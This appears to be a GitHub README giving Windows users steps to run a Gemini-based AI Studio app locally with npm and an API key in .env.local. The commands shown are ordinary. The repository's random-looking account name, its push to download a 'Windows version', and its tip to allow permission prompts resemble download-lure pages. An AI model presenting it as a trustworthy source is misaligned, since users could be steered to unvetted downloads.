# ⚡ vectorshift - Run your AI app with ease

[![Download vectorshift](https://img.shields.io/badge/Download-vectorshift-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Hinderanceleiopelmatidae328/vectorshift)

## 🚀 What this app does

vectorshift helps you run an AI Studio app on your Windows PC. It gives you a simple way to set up the app, add your Gemini API key, and start the app in your browser.

Use it if you want to:

- run the app on your own computer
- test your AI Studio app locally
- keep your setup in one place
- start the app without a long setup process

## 📥 Download vectorshift

Visit this page to download or access the project:

https://github.com/Hinderanceleiopelmatidae328/vectorshift

If the page opens in your browser, look for the project files or the latest release files on the page, then download the Windows version if one is provided.

## 🖥️ What you need on Windows

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- an internet connection
- Node.js installed
- a web browser such as Chrome, Edge, or Firefox
- your Gemini API key

Node.js is the tool that lets the app run on your computer. If you do not have it yet, install it before you continue.

## 🧰 Install Node.js

1. Open your browser.
2. Go to the Node.js website.
3. Download the Windows installer.
4. Open the file you downloaded.
5. Follow the on-screen steps.
6. Finish the setup.

After that, restart your computer if Windows asks for it.

## ⚙️ Set up the app

1. Open the vectorshift project folder.
2. Find the file named `.env.local`.
3. Open it with Notepad.
4. Add your Gemini API key to this line:

   `GEMINI_API_KEY=your_api_key_here`

5. Save the file.

If you do not have a Gemini API key yet, create one in your Gemini account before you move on.

## ▶️ Run the app

1. Open the project folder.
2. Click the address bar in File Explorer.
3. Type `cmd` and press Enter.
4. In the command window, run this command:

   `npm install`

5. Wait for the install to finish.
6. Run this command next:

   `npm run dev`

7. Wait for the app to start.
8. Open the local address shown in the command window in your browser.

The app should now load in your browser and be ready to use.

## 🔍 How to use it

After the app starts, you can use it like a normal web app.

1. Keep the command window open.
2. Leave the browser tab open.
3. Use the app in your browser.
4. If you change the setup file, restart the app so it can read the new settings.

## 🛠️ Common tasks

### Add or change your API key

1. Stop the app by closing the command window.
2. Open `.env.local`.
3. Replace the API key.
4. Save the file.
5. Run `npm run dev` again.

### Restart the app

1. Go to the command window.
2. Press `Ctrl + C`.
3. Type `npm run dev`.
4. Press Enter.

### Reinstall files

If the app does not start, run:

`npm install`

This rebuilds the needed files for the project.

## 📂 Project files

You may see these files in the folder:

- `package.json` — list of app files and commands
- `.env.local` — where your Gemini API key goes
- `node_modules` — installed app files
- source files for the app
- README file with setup steps

## 🔧 Basic checks

If the app does not open, check these items:

- Node.js is installed
- your internet connection is working
- the API key is typed in the right file
- you ran `npm install` before `npm run dev`
- the command window still shows the app running

## 🪟 Windows tips

- Use File Explorer to find the project folder.
- Open the folder, then use the address bar to open Command Prompt.
- Keep the command window open while using the app.
- If Windows asks for permission, allow the app to run.
- If you move the folder, open it again and run the commands again

## 📘 Folder setup

A simple setup looks like this:

- Download or clone the project
- Install Node.js
- Add your Gemini API key
- Run `npm install`
- Run `npm run dev`
- Open the local app in your browser

## 🌐 View the app in AI Studio

You can also view the app in AI Studio here:

https://ai.studio/apps/drive/1dIZ1r5Rr0LZVJb7zvVEs9ltdrHWO0l75

Use this link if you want to compare the local version with the hosted version or check how the app is meant to look and work